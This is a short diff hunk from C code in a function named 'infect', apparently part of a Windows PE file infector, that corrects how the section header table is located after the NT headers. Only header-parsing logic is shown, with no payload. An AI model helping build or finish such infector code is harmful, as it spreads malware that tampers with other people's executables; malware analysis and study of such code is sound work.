@@ -26,7 +26,7 @@ int infect(const char* filename, data_t* data) {
   
   ntHeaders = get_nt_header(fileView.startAddress);
 
-  IMAGE_SECTION_HEADER* sectionHeader = (IMAGE_SECTION_HEADER*) (ntHeaders + 1);
+  IMAGE_SECTION_HEADER* sectionHeader = (IMAGE_SECTION_HEADER*) ((uint8_t*)ntHeaders + sizeof(IMAGE_NT_HEADERS)); //was ntHeaders + 1???
   sectionHeader += ntHeaders->FileHeader.NumberOfSections;
 
   if (!is_section_header_empty(sectionHeader)) {
